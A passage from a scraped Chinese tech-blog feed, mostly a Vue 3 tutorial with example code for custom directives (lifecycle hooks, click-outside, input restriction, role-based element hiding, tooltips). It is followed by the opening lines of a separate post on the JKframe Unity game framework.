    &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const textColor = ref('red')

const changeColor = () =&gt; {
  textColor.value = textColor.value === 'red' ? 'blue' : 'red'
}

// 局部自定义指令
const vFocusLocal = {
  mounted(el) {
    el.focus()
  }
}

const vColorLocal = {
  beforeMount(el, binding) {
    el.style.color = binding.value
  },
  updated(el, binding) {
    el.style.color = binding.value
  }
}
&lt;/script&gt;
</code></pre>
<hr/>
<h2 data-id="heading-15"><strong>四、 完整生命周期示例</strong></h2>
<p>让我们通过一个完整的示例来演示所有生命周期钩子的使用：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="demo-container"&gt;
    &lt;h2&gt;自定义指令完整生命周期演示&lt;/h2&gt;
    
    &lt;div&gt;
      &lt;button @click="toggleDisplay"&gt;{{ isVisible ? '隐藏' : '显示' }}元素&lt;/button&gt;
      &lt;button @click="changeMessage"&gt;改变消息&lt;/button&gt;
      &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
    &lt;/div&gt;

    &lt;div v-if="isVisible" v-lifecycle-demo:arg.modifier="directiveValue" 
         class="demo-element" :style="{ color: elementColor }"&gt;
      {{ message }}
    &lt;/div&gt;

    &lt;div class="log-container"&gt;
      &lt;h3&gt;生命周期日志：&lt;/h3&gt;
      &lt;div v-for="(log, index) in logs" :key="index" class="log-item"&gt;
        {{ log }}
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

const isVisible = ref(false)
const message = ref('Hello, Custom Directive!')
const elementColor = ref('#333')
const logs = ref([])

const directiveValue = reactive({
  text: '指令值对象',
  count: 0
})

// 添加日志函数
const addLog = (hookName, el, binding) =&gt; {
  const log = `[${new Date().toLocaleTimeString()}] ${hookName}: value=${JSON.stringify(binding.value)}, arg=${binding.arg}`
  logs.value.push(log)
  // 保持日志数量不超过20条
  if (logs.value.length &gt; 20) {
    logs.value.shift()
  }
}

// 完整的生命周期指令
const vLifecycleDemo = {
  created(el, binding) {
    addLog('created', el, binding)
    console.log('created - 指令创建，元素还未挂载')
  },
  
  beforeMount(el, binding) {
    addLog('beforeMount', el, binding)
    console.log('beforeMount - 元素挂载前')
    el.style.transition = 'all 0.3s ease'
  },
  
  mounted(el, binding) {
    addLog('mounted', el, binding)
    console.log('mounted - 元素挂载完成')
    console.log('修饰符:', binding.modifiers)
    console.log('参数:', binding.arg)
    
    // 添加动画效果
    el.style.opacity = '0'
    el.style.transform = 'translateY(-20px)'
    
    setTimeout(() =&gt; {
      el.style.opacity = '1'
      el.style.transform = 'translateY(0)'
    }, 100)
  },
  
  beforeUpdate(el, binding) {
    addLog('beforeUpdate', el, binding)
    console.log('beforeUpdate - 元素更新前')
  },
  
  updated(el, binding) {
    addLog('updated', el, binding)
    console.log('updated - 元素更新完成')
    
    // 更新时的动画
    el.style.backgroundColor = '#e3f2fd'
    setTimeout(() =&gt; {
      el.style.backgroundColor = ''
    }, 500)
  },
  
  beforeUnmount(el, binding) {
    addLog('beforeUnmount', el, binding)
    console.log('beforeUnmount - 元素卸载前')
    
    // 卸载动画
    el.style.opacity = '1'
    el.style.transform = 'translateY(0)'
    el.style.opacity = '0'
    el.style.transform = 'translateY(-20px)'
  },
  
  unmounted(el, binding) {
    addLog('unmounted', el, binding)
    console.log('unmounted - 元素卸载完成')
  }
}

const toggleDisplay = () =&gt; {
  isVisible.value = !isVisible.value
}

const changeMessage = () =&gt; {
  message.value = `消息已更新 ${Date.now()}`
  directiveValue.count++
}

const changeColor = () =&gt; {
  const colors = ['#ff4444', '#44ff44', '#4444ff', '#ff44ff', '#ffff44']
  elementColor.value = colors[Math.floor(Math.random() * colors.length)]
}
&lt;/script&gt;

&lt;style scoped&gt;
.demo-container {
  padding: 20px;
  max-width: 800px;
  margin: 0 auto;
}

.demo-element {
  padding: 20px;
  margin: 20px 0;
  border: 2px solid #42b983;
  border-radius: 8px;
  background: #f9f9f9;
}

.log-container {
  margin-top: 20px;
  padding: 15px;
  background: #f5f5f5;
  border-radius: 8px;
  max-height: 400px;
  overflow-y: auto;
}

.log-item {
  padding: 5px 10px;
  margin: 2px 0;
  background: white;
  border-radius: 4px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
}

button {
  margin: 5px;
  padding: 8px 16px;
  background: #42b983;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background: #369870;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h2 data-id="heading-16"><strong>五、 实用自定义指令示例</strong></h2>
<h3 data-id="heading-17"><strong>5.1 点击外部关闭指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="click-outside-demo"&gt;
    &lt;h2&gt;点击外部关闭演示&lt;/h2&gt;
    
    &lt;button @click="showDropdown = !showDropdown"&gt;
      切换下拉菜单 {{ showDropdown ? '▲' : '▼' }}
    &lt;/button&gt;

    &lt;div v-if="showDropdown" v-click-outside="closeDropdown" class="dropdown"&gt;
      &lt;div class="dropdown-item"&gt;菜单项 1&lt;/div&gt;
      &lt;div class="dropdown-item"&gt;菜单项 2&lt;/div&gt;
      &lt;div class="dropdown-item"&gt;菜单项 3&lt;/div&gt;
    &lt;/div&gt;

    &lt;div v-if="showModal" v-click-outside="closeModal" class="modal"&gt;
      &lt;div class="modal-content"&gt;
        &lt;h3&gt;模态框&lt;/h3&gt;
        &lt;p&gt;点击模态框外部可以关闭&lt;/p&gt;
        &lt;button @click="showModal = false"&gt;关闭&lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;

    &lt;button @click="showModal = true" style="margin-left: 10px;"&gt;
      打开模态框
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const showDropdown = ref(false)
const showModal = ref(false)

// 点击外部关闭指令
const vClickOutside = {
  mounted(el, binding) {
    el._clickOutsideHandler = (event) =&gt; {
      // 检查点击是否在元素外部
      if (!(el === event.target || el.contains(event.target))) {
        binding.value(event)
      }
    }
    document.addEventListener('click', el._clickOutsideHandler)
  },
  unmounted(el) {
    document.removeEventListener('click', el._clickOutsideHandler)
  }
}

const closeDropdown = () =&gt; {
  showDropdown.value = false
}

const closeModal = () =&gt; {
  showModal.value = false
}
&lt;/script&gt;

&lt;style scoped&gt;
.dropdown {
  position: absolute;
  top: 100%;
  left: 0;
  background: white;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  z-index: 1000;
  margin-top: 5px;
}

.dropdown-item {
  padding: 10px 20px;
  cursor: pointer;
  border-bottom: 1px solid #eee;
}

.dropdown-item:hover {
  background: #f5f5f5;
}

.dropdown-item:last-child {
  border-bottom: none;
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 2000;
}

.modal-content {
  background: white;
  padding: 30px;
  border-radius: 8px;
  max-width: 400px;
  width: 90%;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-18"><strong>5.2 输入限制指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="input-restriction-demo"&gt;
    &lt;h2&gt;输入限制指令演示&lt;/h2&gt;
    
    &lt;div class="input-group"&gt;
      &lt;label&gt;仅数字输入：&lt;/label&gt;
      &lt;input v-number-only v-model="numberInput" placeholder="只能输入数字" /&gt;
      &lt;span&gt;值: {{ numberInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;最大长度限制：&lt;/label&gt;
      &lt;input v-limit-length="10" v-model="limitedInput" placeholder="最多10个字符" /&gt;
      &lt;span&gt;值: {{ limitedInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;禁止特殊字符：&lt;/label&gt;
      &lt;input v-no-special-chars v-model="noSpecialInput" placeholder="不能输入特殊字符" /&gt;
      &lt;span&gt;值: {{ noSpecialInput }}&lt;/span&gt;
    &lt;/div&gt;

    &lt;div class="input-group"&gt;
      &lt;label&gt;自动格式化手机号：&lt;/label&gt;
      &lt;input v-phone-format v-model="phoneInput" placeholder="输入手机号" /&gt;
      &lt;span&gt;值: {{ phoneInput }}&lt;/span&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const numberInput = ref('')
const limitedInput = ref('')
const noSpecialInput = ref('')
const phoneInput = ref('')

// 仅数字输入指令
const vNumberOnly = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      e.target.value = e.target.value.replace(/[^\d]/g, '')
      // 触发 v-model 更新
      e.dispatchEvent(new Event('input'))
    })
  }
}

// 长度限制指令
const vLimitLength = {
  mounted(el, binding) {
    const maxLength = binding.value
    el.setAttribute('maxlength', maxLength)
    
    el.addEventListener('input', (e) =&gt; {
      if (e.target.value.length &gt; maxLength) {
        e.target.value = e.target.value.slice(0, maxLength)
        e.dispatchEvent(new Event('input'))
      }
    })
  }
}

// 禁止特殊字符指令
const vNoSpecialChars = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      e.target.value = e.target.value.replace(/[^a-zA-Z0-9\u4e00-\u9fa5]/g, '')
      e.dispatchEvent(new Event('input'))
    })
  }
}

// 手机号格式化指令
const vPhoneFormat = {
  mounted(el) {
    el.addEventListener('input', (e) =&gt; {
      let value = e.target.value.replace(/\D/g, '')
      
      if (value.length &gt; 3 &amp;&amp; value.length &lt;= 7) {
        value = value.replace(/(\d{3})(\d+)/, '$1-$2')
      } else if (value.length &gt; 7) {
        value = value.replace(/(\d{3})(\d{4})(\d+)/, '$1-$2-$3')
      }
      
      e.target.value = value
      e.dispatchEvent(new Event('input'))
    })
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.input-restriction-demo {
  padding: 20px;
}

.input-group {
  margin: 15px 0;
}

label {
  display: inline-block;
  width: 150px;
  font-weight: bold;
}

input {
  padding: 8px;
  border: 1px solid #ddd;
  border-radius: 4px;
  margin: 0 10px;
  width: 200px;
}

span {
  color: #666;
  font-size: 14px;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-19"><strong>5.3 权限控制指令</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="permission-demo"&gt;
    &lt;h2&gt;权限控制指令演示&lt;/h2&gt;
    
    &lt;div class="user-info"&gt;
      &lt;label&gt;当前用户角色：&lt;/label&gt;
      &lt;select v-model="currentRole" @change="updatePermissions"&gt;
        &lt;option value="guest"&gt;游客&lt;/option&gt;
        &lt;option value="user"&gt;普通用户&lt;/option&gt;
        &lt;option value="editor"&gt;编辑者&lt;/option&gt;
        &lt;option value="admin"&gt;管理员&lt;/option&gt;
      &lt;/select&gt;
    &lt;/div&gt;

    &lt;div class="permission-list"&gt;
      &lt;h3&gt;可用功能：&lt;/h3&gt;
      
      &lt;button v-permission="'view'" class="feature-btn"&gt;
        🔍 查看内容
      &lt;/button&gt;
      
      &lt;button v-permission="'edit'" class="feature-btn"&gt;
        ✏️ 编辑内容
      &lt;/button&gt;
      
      &lt;button v-permission="'delete'" class="feature-btn"&gt;
        🗑️ 删除内容
      &lt;/button&gt;
      
      &lt;button v-permission="'admin'" class="feature-btn"&gt;
        ⚙️ 系统管理
      &lt;/button&gt;
      
      &lt;button v-permission="['edit', 'delete']" class="feature-btn"&gt;
        🔄 批量操作
      &lt;/button&gt;
    &lt;/div&gt;

    &lt;div class="current-permissions"&gt;
      &lt;h3&gt;当前权限：&lt;/h3&gt;
      &lt;ul&gt;
        &lt;li v-for="permission in currentPermissions" :key="permission"&gt;
          {{ permission }}
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

// 角色权限映射
const rolePermissions = {
  guest: ['view'],
  user: ['view', 'edit'],
  editor: ['view', 'edit', 'delete'],
  admin: ['view', 'edit', 'delete', 'admin']
}

const currentRole = ref('user')
const currentPermissions = ref(['view', 'edit'])

// 权限控制指令
const vPermission = {
  mounted(el, binding) {
    checkPermission(el, binding)
  },
  updated(el, binding) {
    checkPermission(el, binding)
  }
}

// 检查权限函数
const checkPermission = (el, binding) =&gt; {
  const requiredPermissions = Array.isArray(binding.value) 
    ? binding.value 
    : [binding.value]
  
  const hasPermission = requiredPermissions.some(permission =&gt; 
    currentPermissions.value.includes(permission)
  )
  
  if (!hasPermission) {
    el.style.display = 'none'
  } else {
    el.style.display = 'inline-block'
  }
}

// 更新权限
const updatePermissions = () =&gt; {
  currentPermissions.value = rolePermissions[currentRole.value] || []
}
&lt;/script&gt;

&lt;style scoped&gt;
.permission-demo {
  padding: 20px;
  max-width: 600px;
  margin: 0 auto;
}

.user-info {
  margin: 20px 0;
}

select {
  padding: 8px;
  border: 1px solid #ddd;
  border-radius: 4px;
  margin-left: 10px;
}

.permission-list {
  margin: 30px 0;
}

.feature-btn {
  display: inline-block;
  padding: 12px 20px;
  margin: 5px;
  background: #42b983;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
  transition: background 0.3s;
}

.feature-btn:hover {
  background: #369870;
}

.current-permissions {
  margin-top: 30px;
  padding: 15px;
  background: #f5f5f5;
  border-radius: 8px;
}

.current-permissions ul {
  list-style: none;
  padding: 0;
}

.current-permissions li {
  padding: 5px 10px;
  background: white;
  margin: 5px 0;
  border-radius: 4px;
  border-left: 4px solid #42b983;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h2 data-id="heading-20"><strong>六、 高级技巧与最佳实践</strong></h2>
<h3 data-id="heading-21"><strong>6.1 指令参数动态化</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-tooltip="tooltipConfig" placeholder="悬浮显示提示" /&gt;
    
    &lt;div v-pin="pinConfig" class="pinned-element"&gt;
      可动态配置的固定元素
    &lt;/div&gt;
    
    &lt;button @click="updateConfig"&gt;更新配置&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

// 动态提示指令
const vTooltip = {
  mounted(el, binding) {
    const config = binding.value
    el.title = config.text
    el.style.cursor = config.cursor || 'help'
    
    if (config.position) {
      el.dataset.position = config.position
    }
  },
  updated(el, binding) {
    const config = binding.value
    el.title = config.text
  }
}

// 动态固定指令
const vPin = {
  mounted(el, binding) {
    updatePinPosition(el, binding)
  },
  updated(el, binding) {
    updatePinPosition(el, binding)
  }
}

const updatePinPosition = (el, binding) =&gt; {
  const config = binding.value
  el.style.position = 'fixed'
  el.style[config.side] = config.distance + 'px'
  el.style.zIndex = config.zIndex || 1000
}

const tooltipConfig = reactive({
  text: '这是一个动态提示',
  cursor: 'help',
  position: 'top'
})

const pinConfig = reactive({
  side: 'top',
  distance: 20,
  zIndex: 1000
})

const updateConfig = () =&gt; {
  tooltipConfig.text = `更新后的提示 ${Date.now()}`
  pinConfig.side = pinConfig.side === 'top' ? 'bottom' : 'top'
  pinConfig.distance = Math.random() * 100 + 20
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-22"><strong>6.2 指令组合与复用</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// directives/composable.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useClickHandlers</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      el.<span class="hljs-property">_clickHandler</span> = binding.<span class="hljs-property">value</span>
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    },
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    }
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useHoverHandlers</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      el.<span class="hljs-property">_mouseenterHandler</span> = binding.<span class="hljs-property">value</span>.<span class="hljs-property">enter</span>
      el.<span class="hljs-property">_mouseleaveHandler</span> = binding.<span class="hljs-property">value</span>.<span class="hljs-property">leave</span>
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseenterHandler</span>) {
        el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_mouseenterHandler</span>)
      }
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseleaveHandler</span>) {
        el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_mouseleaveHandler</span>)
      }
    },
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseenterHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_mouseenterHandler</span>)
      }
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_mouseleaveHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_mouseleaveHandler</span>)
      }
    }
  }
}

<span class="hljs-comment">// 组合指令</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> vInteractive = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { click, hover } = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-keyword">if</span> (click) {
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, click)
      el.<span class="hljs-property">_clickHandler</span> = click
    }
    
    <span class="hljs-keyword">if</span> (hover) {
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, hover.<span class="hljs-property">enter</span>)
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, hover.<span class="hljs-property">leave</span>)
      el.<span class="hljs-property">_hoverHandlers</span> = hover
    }
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_clickHandler</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickHandler</span>)
    }
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_hoverHandlers</span>) {
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseenter'</span>, el.<span class="hljs-property">_hoverHandlers</span>.<span class="hljs-property">enter</span>)
      el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseleave'</span>, el.<span class="hljs-property">_hoverHandlers</span>.<span class="hljs-property">leave</span>)
    }
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-23"><strong>七、 总结</strong></h2>
<h3 data-id="heading-24"><strong>7.1 核心要点回顾</strong></h3>
<ol>
<li><strong>生命周期钩子</strong>：Vue3 提供了 7 个生命周期钩子，覆盖了指令的完整生命周期</li>
<li><strong>参数传递</strong>：通过 <code>binding</code> 对象可以访问指令的值、参数、修饰符等信息</li>
<li><strong>多种定义方式</strong>：支持全局注册和局部注册，兼容选项式 API 和组合式 API</li>
<li><strong>灵活性</strong>：指令可以接收动态参数、对象值，支持复杂的交互逻辑</li>
</ol>
<h3 data-id="heading-25"><strong>7.2 最佳实践</strong></h3>
<ol>
<li><strong>命名规范</strong>：使用小写字母和连字符命名指令</li>
<li><strong>内存管理</strong>：在 <code>unmounted</code> 钩子中清理事件监听器和定时器</li>
<li><strong>性能优化</strong>：避免在指令中进行昂贵的 DOM 操作</li>
<li><strong>可复用性</strong>：将通用指令提取为独立模块</li>
<li><strong>类型安全</strong>：为指令提供 TypeScript 类型定义</li>
</ol>
<h3 data-id="heading-26"><strong>7.3 适用场景</strong></h3>
<ul>
<li><strong>DOM 操作</strong>：焦点管理、元素定位、动画控制</li>
<li><strong>输入处理</strong>：格式化、验证、限制</li>
<li><strong>用户交互</strong>：点击外部、滚动加载、拖拽</li>
<li><strong>权限控制</strong>：基于角色的元素显示/隐藏</li>
<li><strong>第三方集成</strong>：包装现有的 JavaScript 库</li>
</ul>
<p>自定义指令是 Vue.js 生态中一个非常强大的特性，合理使用可以极大地提高代码的复用性和可维护性。希望本文能帮助你全面掌握 Vue3 中的自定义指令！</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，欢迎点赞、收藏和评论！有任何问题都可以在评论区讨论。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[游戏框架文档]]></title>    <link>https://juejin.cn/post/7575655132748120100</link>    <guid>https://juejin.cn/post/7575655132748120100</guid>    <pubDate>2025-11-23T05:31:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748120100" data-draft-id="7575313772988104745" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="游戏框架文档"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T05:31:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户8922541182901"/> <meta itemprop="url" content="https://juejin.cn/user/1179135862128471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            游戏框架文档
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1179135862128471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户8922541182901
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:31:32.000Z" title="Sun Nov 23 2025 05:31:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1小时+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">框架启用和功能介绍</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95d678904af14e5bb1c005c050428fff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=3w0pQYTYh4C7nsGc6I%2Fo1sfJbhs%3D" alt="alt" loading="lazy"/>​</p>
<p>将框架预制体拖入Hierarchy中即可，脚本中使用时using JKframe命名空间，框架的github地址,为了避免框架中UI部分对Scene场景中交互产生干扰，建议把框架交互屏蔽掉。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94e08ccc0bd047ac8f56ace927a980b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=9YogGAsKgrHRD1ZaaVLHjlBhMt4%3D" alt="alt" loading="lazy"/>​</p>
<p>框架类似工具箱和插件，除了UI窗口外的大多情况下，并不需要继承什么类或接口，直接通过XXXSystem调用即可。主要功能系统：</p>
<ol start="0">
